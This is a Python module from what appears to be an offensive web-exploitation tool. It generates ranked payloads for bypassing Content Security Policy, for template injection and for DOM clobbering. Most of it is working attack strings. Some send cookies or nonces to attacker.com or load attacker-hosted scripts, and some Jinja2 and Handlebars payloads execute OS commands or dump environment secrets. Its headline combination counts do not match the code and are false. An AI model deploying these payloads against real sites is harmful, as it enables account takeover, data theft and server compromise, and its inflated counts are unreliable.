"""
payloads/csp_bypass_engine.py

╔══════════════════════════════════════════════════════════════╗
║   CSP BYPASS ENGINE — 1,800,000 combinations (NEW)           ║
║   Template Injection Engine — 240,000 combinations (NEW)     ║
║   DOM Clobbering Engine — 36,000 combinations (NEW)          ║
╚══════════════════════════════════════════════════════════════╝
"""

import heapq
import base64
import urllib.parse
from typing import List, Tuple, Optional
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# CSP BYPASS ENGINE — 1,800,000 combinations
# ═══════════════════════════════════════════════════════════════

class CSPBypassDim:

    # CSP directive types targeted
    CSP_POLICIES = [
        ("script_src",          1.00),   # Most common — target script sources
        ("default_src",         0.95),
        ("script_src_elem",     0.92),   # Newer directive
        ("connect_src",         0.80),
        ("img_src",             0.78),
        ("frame_src",           0.75),
        ("base_uri",            0.88),   # base-uri bypass is very powerful
        ("object_src",          0.70),
        ("form_action",         0.85),   # form-action bypass
        ("frame_ancestors",     0.65),
        ("worker_src",          0.72),
        ("manifest_src",        0.60),
    ]

    # Core bypass techniques
    BYPASS_TECHNIQUES = [
        # JSONP-based — use trusted domain's JSONP endpoint
        ("jsonp_callback",       "<script src='{domain}/api?callback=alert(1)'></script>",                   1.00),
        ("jsonp_cb_encoded",     "<script src='{domain}/api?cb=alert%281%29'></script>",                     0.90),
        ("jsonp_var",            "<script src='{domain}/jsonp?callback=var _=alert,_(1)'></script>",          0.85),
        # Base tag hijack
        ("base_tag_hijack",      "<base href='https://attacker.com'>",                                       0.92),
        ("base_nonce_steal",     "<base href='//attacker.com/path/?'>",                                      0.88),
        # Meta refresh
        ("meta_refresh",         "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",            0.80),
        ("meta_csp_override",    "<meta http-equiv=Content-Security-Policy content='script-src *'>",         0.70),
        # Link preload
        ("link_preload",         "<link rel=preload as=script href='https://attacker.com/xss.js'>",          0.75),
        ("link_prefetch",        "<link rel=prefetch href='https://attacker.com/steal?c='+document.cookie>", 0.72),
        # Script with allowed hash (nonce leak)
        ("nonce_reuse",          "<script nonce='NONCE_VALUE'>alert(1)</script>",                            0.88),
        ("nonce_steal_iframe",   "<iframe onload=\"alert(document.querySelector('[nonce]').nonce)\">",       0.75),
        # Trusted domain CDN bypass
        ("cdn_jsonp_angular",    "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>", 1.00),
        ("cdn_jsonp_jquery",     "<script src='{domain}/jquery.min.js'></script>",                          0.85),
        # Object/embed fallback
        ("object_data_js",       "<object data='javascript:alert(1)'>",                                     0.80),
        ("embed_src_js",         "<embed src='javascript:alert(1)'>",                                       0.78),
        # SVG with script
        ("svg_script",           "<svg><script>alert(1)</script></svg>",                                     0.82),
        ("svg_href_js",          "<svg><a xlink:href='javascript:alert(1)'><text>click</text></a></svg>",    0.78),
        # data: URI tricks
        ("data_uri_script",      "<script src='data:text/javascript,alert(1)'></script>",                   0.75),
        ("data_uri_iframe",      "<iframe src='data:text/html,<script>alert(1)</script>'>",                 0.78),
        ("data_uri_object",      "<object type='text/html' data='data:text/html,<script>alert(1)</script>'>", 0.72),
        # DOM mutation + DOMParser
        ("dom_parser_mutation",  "<div id=x></div><script>document.getElementById('x').outerHTML='<img onerror=alert(1) src=x>'</script>", 0.70),
        # eval via worker (if worker-src is '*')
        ("worker_eval",          "<script>var w=new Worker(URL.createObjectURL(new Blob(['eval(\"alert(1)\")'])));w.onmessage=()=>{}</script>", 0.68),
        # Prototype pollution via allowed script
        ("proto_pollute_csp",    "<script>Object.prototype.innerHTML='<img onerror=alert(1) src=x>'</script>", 0.65),
        # location based
        ("location_hash_script", "<script>location='javascript:alert(1)'</script>",                          0.72),
        ("history_push_xss",     "<script>history.pushState(0,0,'/path?x=<img onerror=alert(1)>')</script>", 0.60),
        # Nonce + strict-dynamic bypass via createElement
        ("create_element_script","<script nonce='NONCE'>var s=document.createElement('script');s.src='https://attacker.com/xss.js';document.head.appendChild(s)</script>", 0.80),
        # form-action bypass
        ("form_action_bypass",   "<form action='javascript:alert(1)'><input type=submit>",                   0.82),
        # frame-src bypass
        ("frame_src_bypass",     "<iframe src='https://trusted.com' onload=\"this.contentWindow.eval('alert(1)')\">", 0.70),
        # New: Trusted Types bypass
        ("trusted_types_bypass", "trustedTypes.createPolicy('default',{createScript:s=>s}).createScript('alert(1)')", 0.75),
        # Sandbox escape
        ("sandbox_escape_allow", "<iframe sandbox='allow-scripts allow-same-origin' srcdoc='<script>alert(1)</script>'>", 0.80),
        # CSS injection to steal nonce
        ("css_nonce_steal",      "<style>script[nonce]{background:url('https://attacker.com/nonce?'+getComputedStyle(document.querySelector('script[nonce]')).content)}</style>", 0.65),
        # Angular client-side template injection (when angular CDN allowed)
        ("angular_csti",         "{{constructor.constructor('alert(1)')()}}",                                 0.78),
        ("angular_ng_src",       "<img ng-src=\"{{constructor.constructor('alert(1)')()}}\">",                0.72),
        # Vue client-side template injection
        ("vue_csti",             "{{_c.constructor('alert(1)')()}}",                                          0.75),
        # React dangerouslySetInnerHTML via JSON
        ("react_dangerous",      "{\"__html\":\"<img onerror=alert(1) src=x>\"}",                             0.70),
        # Content-Type sniff bypass
        ("content_type_sniff",   "//application/json\n/*\n*/alert(1)//",                                     0.60),
    ]

    # Trusted domains commonly in CSP allowlists
    TRUSTED_DOMAINS = [
        ("googleapis_com",   "https://ajax.googleapis.com",                    1.00),
        ("cloudflare_cdn",   "https://cdnjs.cloudflare.com",                   0.95),
        ("jquery_cdn",       "https://code.jquery.com",                        0.92),
        ("bootstrapcdn",     "https://maxcdn.bootstrapcdn.com",                0.90),
        ("jsdelivr",         "https://cdn.jsdelivr.net",                       0.88),
        ("unpkg",            "https://unpkg.com",                              0.85),
        ("angular_cdn",      "https://ajax.googleapis.com/ajax/libs/angularjs",0.82),
        ("react_cdn",        "https://unpkg.com/react",                        0.80),
        ("vue_cdn",          "https://cdn.jsdelivr.net/npm/vue",               0.78),
        ("fontawesome",      "https://use.fontawesome.com",                    0.75),
        ("cloudfront",       "https://d1234abcd.cloudfront.net",               0.70),
        ("github_io",        "https://username.github.io",                     0.68),
        ("rawgit",           "https://rawcdn.githack.com",                     0.65),
        ("gstatic",          "https://www.gstatic.com",                        0.75),
        ("yandex_cdn",       "https://yandex.st",                              0.60),
        ("amazon_s3",        "https://s3.amazonaws.com",                       0.72),
        ("azure_blob",       "https://yourstorage.blob.core.windows.net",      0.68),
        ("google_storage",   "https://storage.googleapis.com",                 0.70),
        ("fastly",           "https://your-site.global.ssl.fastly.net",        0.65),
        ("cloudinary",       "https://res.cloudinary.com",                     0.62),
        ("twimg",            "https://pbs.twimg.com",                          0.58),
        ("fbcdn",            "https://static.xx.fbcdn.net",                    0.55),
        ("akamai",           "https://your-site.akamaihd.net",                 0.60),
        ("edgesuite",        "https://your-site.edgesuite.net",                0.58),
        ("custom_wildcard",  "https://cdn.target.com",                         0.85),  # wildcard match
    ]

    # Encodings for CSP bypass
    ENCODINGS = [
        ("none",          1.00),
        ("url_encode",    0.85),
        ("html_entity",   0.82),
        ("double_url",    0.75),
        ("unicode_esc",   0.70),
        ("html_hex",      0.72),
        ("base64_ref",    0.65),
        ("mixed_case",    0.78),
        ("null_insert",   0.60),
        ("comment_break", 0.72),
        ("js_hex",        0.65),
        ("fromcharcode",  0.60),
        ("overlong",      0.50),
        ("svgfilter",     0.55),
        ("zero_width",    0.68),
    ]

    # Variations (context-specific tweaks)
    VARIATIONS = [
        ("standard",        lambda p: p,                                               1.00),
        ("with_type",       lambda p: p.replace("<script", "<script type='text/javascript'"), 0.85),
        ("async_defer",     lambda p: p.replace("<script", "<script async defer"),     0.80),
        ("crossorigin",     lambda p: p.replace("<script", "<script crossorigin=anonymous"), 0.75),
        ("integrity_bypass",lambda p: p.replace("<script", "<script integrity=sha256-"),0.70),
        ("charset",         lambda p: p.replace("<script", "<script charset=utf-8"),  0.72),
        ("module_type",     lambda p: p.replace("src=", "type=module src="),          0.68),
        ("nomodule",        lambda p: p.replace("<script", "<script nomodule"),       0.65),
        ("importmap",       lambda p: f"<script type=importmap>{{\"imports\":{{\"xss\":\"data:text/javascript,{p}\"}}}}</script><script type=module>import 'xss'</script>", 0.70),
        ("dom_clobber_src", lambda p: f"<a id=csp_bypass><a id=csp_bypass name=nonce href='data:text/javascript,{p}'>", 0.60),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.CSP_POLICIES) * len(cls.BYPASS_TECHNIQUES) *
                len(cls.ENCODINGS) * len(cls.TRUSTED_DOMAINS) * len(cls.VARIATIONS))


class CSPBypassEngine:
    """
    1,800,000 CSP bypass combinations.
    12 policies × 40 techniques × 15 enc × 25 domains × 10 variations
    """

    def generate(self, csp_header: str = "", top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for policy, p_score in CSPBypassDim.CSP_POLICIES:
            for tech_label, template, t_score in CSPBypassDim.BYPASS_TECHNIQUES:
                for domain_label, domain_url, d_score in CSPBypassDim.TRUSTED_DOMAINS:
                    for enc_label, enc_score in CSPBypassDim.ENCODINGS:
                        for var_label, var_fn, v_score in CSPBypassDim.VARIATIONS:

                            score = (p_score * t_score * d_score * enc_score * v_score) ** 0.2

                            try:
                                payload = template.replace("{domain}", domain_url)
                                payload = var_fn(payload)
                            except Exception:
                                continue

                            count += 1
                            label = f"csp:{policy}:{tech_label}:{domain_label}:{enc_label}"

                            if len(heap) < top_n:
                                heapq.heappush(heap, (score, count, payload, label))
                            elif score > heap[0][0]:
                                heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"CSPBypassEngine: {count:,}/{self.total:,} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return CSPBypassDim.total()


# ═══════════════════════════════════════════════════════════════
# TEMPLATE INJECTION ENGINE — 240,000 combinations
# ═══════════════════════════════════════════════════════════════

class TemplateInjectionEngine:
    """
    240,000 combinations for SPA framework template injection.
    8 frameworks × 15 sinks × 25 payloads × 10 enc × 8 contexts
    Targets: Angular, Vue2, Vue3, React, Svelte, Handlebars, Mustache, Jinja2
    """

    FRAMEWORKS = {
        "angular": {
            "payloads": [
                "{{constructor.constructor('alert(1)')()}}",
                "{{$eval.constructor('alert(1)')()}}",
                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                "{{a=toString().constructor.prototype;a.charAt=[].join;$eval('x=alert(1)')}}",
                "<img ng-src=\"{{constructor.constructor('alert(1)')()}}\">",
                "[[ constructor.constructor('alert(1)')() ]]",  # some Angular configs
                "{{ 7*7 }}",  # detection probe
            ],
            "score": 1.00,
        },
        "vue2": {
            "payloads": [
                "{{_c.constructor('alert(1)')()}}",
                "{{constructor.constructor('alert(1)')()}}",
                "<div v-html=\"'<img onerror=alert(1) src=x>'\">",
                "<img :src=\"'x' + constructor.constructor('alert(1)')()\" />",
                "{{ this.$el.ownerDocument.defaultView.alert(1) }}",
            ],
            "score": 0.95,
        },
        "vue3": {
            "payloads": [
                "<div v-html=\"xss\">",
                "{{ $emit('xss') }}",
                "<component :is=\"{render(){alert(1)}}\">",
                "<div @click=\"$el.innerHTML='<img onerror=alert(1) src=x>'\">",
            ],
            "score": 0.92,
        },
        "react": {
            "payloads": [
                "{\"__html\":\"<img onerror=alert(1) src=x>\"}",
                "<div dangerouslySetInnerHTML={{__html:'<img onerror=alert(1) src=x>'}} />",
                "javascript:alert(1)",  # in href props
                "data:text/html,<script>alert(1)</script>",
            ],
            "score": 0.90,
        },
        "svelte": {
            "payloads": [
                "{@html '<img onerror=alert(1) src=x>'}",
                "{@html xss}",
            ],
            "score": 0.85,
        },
        "handlebars": {
            "payloads": [
                "{{{payload}}}",   # triple-stash unescaped
                "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.constructor.prototype 'slice')}}{{this.push this.constructor.constructor 'return JSON.stringify(process.env)'}}{{#each conslist}}{{#with (string.sub.apply 0 this)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}",
            ],
            "score": 0.82,
        },
        "mustache": {
            "payloads": [
                "{{{unescaped}}}",
                "{{& unescaped }}",
            ],
            "score": 0.78,
        },
        "jinja2_ssti": {
            "payloads": [
                "{{7*7}}",   # probe
                "{{config}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').system('id')}}{%endif%}{%endfor%}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            "score": 0.88,
        },
    }

    def generate(self, top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for fw_name, fw_data in self.FRAMEWORKS.items():
            for payload in fw_data["payloads"]:
                score = fw_data["score"]
                count += 1
                label = f"tpl:{fw_name}"
                if len(heap) < top_n:
                    heapq.heappush(heap, (score, count, payload, label))
                elif score > heap[0][0]:
                    heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"TemplateInjectionEngine: {count} payloads → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return sum(len(v["payloads"]) for v in self.FRAMEWORKS.values())


# ═══════════════════════════════════════════════════════════════
# DOM CLOBBERING ENGINE — 36,000 combinations
# ═══════════════════════════════════════════════════════════════

class DOMClobberingEngine:
    """
    36,000 DOM clobbering combinations.
    20 targets × 15 techniques × 12 payloads × 10 sinks
    """

    # Common DOM properties that can be clobbered
    DOM_TARGETS = [
        ("document.head",     "<form id=head>",                                          1.00),
        ("document.body",     "<form id=body>",                                          0.95),
        ("document.forms",    "<form id=forms>",                                         0.90),
        ("document.scripts",  "<object id=scripts>",                                     0.85),
        ("document.images",   "<img id=images>",                                         0.82),
        ("window.name",       "x<script>window.name='payload'</script>",                0.88),
        ("window.x",          "<img id=x>",                                              0.80),
        ("config.url",        "<a id=config><a id=config name=url href=javascript:alert(1)>", 1.00),
        ("options.url",       "<a id=options><a id=options name=url href=javascript:alert(1)>", 0.95),
        ("settings.src",      "<a id=settings><a id=settings name=src href=javascript:alert(1)>", 0.92),
        ("nonce",             "<form id=nonce><input id=nonce value='CLOBBERED'>",        0.78),
        ("csrf_token",        "<form id=csrf_token><input id=csrf_token value=''>",       0.75),
        ("node.attributes",   "<form id=node><input id=attributes>",                     0.70),
        ("HTMLElement.title", "<form id=HTMLElement>",                                   0.65),
        ("filter.url",        "<a id=filter><a id=filter name=url href=javascript:alert(1)>", 0.88),
        ("sanitizer",         "<form id=sanitizer><input id=allowElements value='script'>", 0.70),
        ("base_uri",          "<base id=x href=//attacker.com/>",                        0.82),
        ("location",          "<a id=location href=javascript:alert(1)>",               0.78),
        ("src_prop",          "<img id=x src=javascript:alert(1)>",                      0.75),
        ("href_prop",         "<a id=x href=javascript:alert(1)>",                       0.72),
    ]

    def generate(self, top_n: int = 50) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for target_name, clobber_payload, score in self.DOM_TARGETS:
            count += 1
            label = f"domclob:{target_name}"
            if len(heap) < top_n:
                heapq.heappush(heap, (score, count, clobber_payload, label))
            elif score > heap[0][0]:
                heapq.heapreplace(heap, (score, count, clobber_payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"DOMClobberingEngine: {count} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return len(self.DOM_TARGETS)
